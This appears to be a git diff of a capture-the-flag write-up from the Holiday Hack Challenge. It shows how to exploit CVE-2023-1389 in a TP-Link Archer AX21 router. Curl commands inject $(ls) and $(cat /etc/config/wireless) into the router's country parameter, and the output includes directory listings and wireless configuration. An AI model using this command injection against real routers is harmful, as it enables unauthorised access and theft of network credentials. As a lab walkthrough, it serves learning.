@@ -21,19 +21,15 @@ Difficulty: ❄️❄️
 
 At the 24-7 shop, Janusz tells us that the gnomes have somehow managed to change the wifi router's admin password and 'probably mucked up' all its settings. 
 
-We are greeted by a login prompt asking us for a password.  The screen tells us that the Hardware version is AX21 v2.0.  If we follow the suggestion in the hint and search for "archer ax21 v2.0 uci vulnerability", the top result is a [statement issued by TP-Link](https://www.tp-link.com/us/support/faq/3643/) regarding a Remote Code execution Vulnerability **CVE-2023-1389**.  This in turn points us to this handy forum post which also includes a script for exploiting the vulnerability: https://osintteam.blog/exploring-cve-2023-1389-rce-in-tp-link-archer-ax21-d7a60f259e94
-https://www.exploit-db.com/exploits/51677
+We are greeted by a login prompt asking us for a password.  The screen tells us that the Hardware version is AX21 v2.0.  If we follow the suggestion in the hint and search for "archer ax21 v2.0 uci vulnerability", the top result is a [statement issued by TP-Link](https://www.tp-link.com/us/support/faq/3643/) regarding a Remote Code execution Vulnerability **[CVE-2023-1389](https://www.exploit-db.com/exploits/51677)**.  This in turn points us to [this handy forum post](https://osintteam.blog/exploring-cve-2023-1389-rce-in-tp-link-archer-ax21-d7a60f259e94) which gives very detailed instructions on how to exploit the vulnerability.
 
+Armed with this information we can try to get the router to execute code remotely using the exploit.  First I got it to execute the `ls` command (note that the command has to be executed twice to give an output):
 
 ```
-┌──(test㉿KaliServer1)-[~]
 └─$ curl -k -X POST \
-  "https://dosis-network-down.holidayhackchallenge.com/cgi-bin/luci/;stok=/locale?form=country" \
-  -d 'operation=write&country=US'
-```
+  "https://dosis-network-down.holidayhackchallenge.com/cgi-bin/luci/;stok=/locale?form=country" -d 'operation=write&country=$(ls)
+OK
 
-```
-┌──(test㉿KaliServer1)-[~]
 └─$ curl -k -X POST \
   "https://dosis-network-down.holidayhackchallenge.com/cgi-bin/luci/;stok=/locale?form=country" -d 'operation=write&country=$(ls)'
 
@@ -56,27 +52,16 @@ var
 www
 ```
 
+Then it was simply a case of finding the config file for the wifi network and reading the password from it:
 
 ```
 ┌──(test㉿KaliServer1)-[~]
 └─$ curl -k -X POST \
   "https://dosis-network-down.holidayhackchallenge.com/cgi-bin/luci/;stok=/locale?form=country" -d 'operation=write&country=$(cat /etc/config/wireless)'
 
-config wifi-device 'radio0'
-        option type 'mac80211'
-        option channel '6'
-        option hwmode '11g'
-        option path 'platform/ahb/18100000.wmac'
-        option htmode 'HT20'
-        option country 'US'
-
-config wifi-device 'radio1'
-        option type 'mac80211'
-        option channel '36'
-        option hwmode '11a'
-        option path 'pci0000:00/0000:00:00.0'
-        option htmode 'VHT80'
-        option country 'US'
+...
+...
+...
 
 config wifi-iface 'default_radio0'
         option device 'radio0'
@@ -97,4 +82,5 @@ config wifi-iface 'default_radio1'
 
 
 
-<img width="782" height="699" alt="image" src="https://github.com/user-attachments/assets/ba88510b-b9fe-4a0e-9dca-6fbf76d22e31" />
+
+
